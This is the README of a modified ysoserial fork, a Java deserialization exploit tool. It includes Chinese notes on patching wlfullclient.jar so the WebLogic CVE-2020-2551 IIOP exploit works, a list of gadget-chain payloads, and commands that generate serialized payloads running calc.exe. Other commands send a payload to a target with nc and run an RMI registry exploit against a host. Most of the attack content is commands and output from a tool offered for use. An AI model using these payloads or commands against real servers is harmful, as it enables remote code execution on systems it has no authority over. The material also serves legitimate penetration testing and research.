# sg_ysoserial

<!--
![logo](ysoserial.png) -->

## Description

clone ysoserial

Modifications and enhancements

## fix

| Exploit - Payload                         |                                               说明 |
| :---------------------------------------- | -------------------------------------------------: |
| **ysoserial.exploit.IIOPRegistryExploit** | Weblogic CVE-2020-2551 利用, 修改 wlfullclient.jar |
| **ysoserial.exploit.RMIRegistryExploit2** |                                             单元格 |

```java
ysoserial.exploit.IIOPRegistryExploit

IOPProfile在项目里的库wlfullclient.jar中定义，wlfullclient.jar是从Weblogic 10.3.6环境中导出来的。

IOPProfile路径：
CVE-2020-2551\src\lib\wlfullclient.jar!\weblogic\iiop\IOPProfile.class

这里有个知识点，Java中可以编译某个库的单个class，然后重新打包，生成新的库，这样就可以改变原来库的处理逻辑。

在原来的ConnectionKey构造下面再重新构造一个连接到指向原来IP端口的ConnectionKey,不影响后续逻辑。

Channel remoteChannel = var1.getEndPoint().getRemoteChannel();
var4 = new ConnectionKey(remoteChannel.getInetAddress().getHostAddress(),remoteChannel.getPublicPort())

不能直接改掉new ConnectionKey(var1),构造的时候会从流中读取一些数据，改掉的话，会影响后面的的数据读取，等它读完了再替换掉就好了。


```

## Usage

```shell
$  java -jar ysoserial.jar
Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
  Available payload types:
五月 22, 2020 8:49:10 上午 org.reflections.Reflections scan
信息: Reflections took 233 ms to scan 1 urls, producing 19 keys and 150 values
     Payload                        Authors                                Dependencies
     -------                        -------                                ------------
     BeanShell1                     @pwntester, @cschneider4711            bsh:2.0b5
     C3P0                           @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Clojure                        @JackOfMostTrades                      clojure:1.8.0
     CommonsBeanutils1              @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsBeanutils1TomcatHeader
     CommonsCollections1            @frohoff                               commons-collections:3.1
     CommonsCollections2            @frohoff                               commons-collections4:4.0
     CommonsCollections2TomcatEcho
     CommonsCollections2TomcatEcho2
     CommonsCollections3            @frohoff                               commons-collections:3.1
     CommonsCollections4            @frohoff                               commons-collections4:4.0
     CommonsCollections5            @matthias_kaiser, @jasinner            commons-collections:3.1
     CommonsCollections6            @matthias_kaiser                       commons-collections:3.1
     CommonsCollections7            @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
     FileUpload1                    @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
     Groovy1                        @frohoff                               groovy:2.3.9
     Hibernate1                     @mbechler
     Hibernate2                     @mbechler
     JBossInterceptors1             @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient                     @mbechler
     JRMPListener                   @mbechler
     JSON1                          @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1                 @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21                        @frohoff
     Jython1                        @pwntester, @cschneider4711            jython-standalone:2.5.2
     MozillaRhino1                  @matthias_kaiser                       js:1.7R2
     MozillaRhino2                  @_tint0                                js:1.7R2
     Myfaces1                       @mbechler
     Myfaces2                       @mbechler
     ROME                           @mbechler                              rome:1.0
     Spring1                        @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2                        @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     URLDNS                         @gebl
     Vaadin1                        @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
     Weblogic_CVE_2020_2555
     Wicket1                        @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
```

## Examples

```shell
$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
...
0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
0000570: 0078 7071 007e 003a                      .xpq.~.:

$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
$ nc 10.10.10.10 1099 < groovypayload.bin

$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
```

## Installation

## Building

Requires Java 1.7+ and Maven 3.x+

`mvn clean package -DskipTests`

## Contributing

## See Also

-   [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet): info on vulnerabilities, tools, blogs/write-ups, etc.
-   [marshalsec](https://github.com/frohoff/marshalsec): similar project for various Java deserialization formats/libraries
-   [ysoserial.net](https://github.com/pwntester/ysoserial.net): similar project for .NET deserialization

## Thanks

-   [ysomap](https://github.com/wh1t3p1g/ysomap)
-   [ysoserial1](http://github.com/threedr3am/ysoserial/)
-   [ysoserial2](http://github.com/buptchk/ysoserial)
